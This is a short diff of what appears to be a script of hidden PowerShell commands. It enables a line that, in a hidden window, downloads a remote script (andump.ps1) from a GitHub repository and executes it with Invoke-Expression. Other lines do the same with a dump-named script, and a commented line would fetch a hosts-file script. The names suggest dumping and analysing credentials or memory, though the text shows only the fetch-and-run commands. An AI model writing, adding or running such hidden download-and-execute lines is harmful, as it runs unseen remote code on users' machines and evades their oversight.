@@ -12,7 +12,7 @@ powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebCl
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/dev/main/macro/cdump.ps1')"
 
 #AnalyzeDump
-#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/dev/main/macro/andump.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/dev/main/macro/andump.ps1')"
 
 #AddHosts
 #powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/hosts.ps1')"
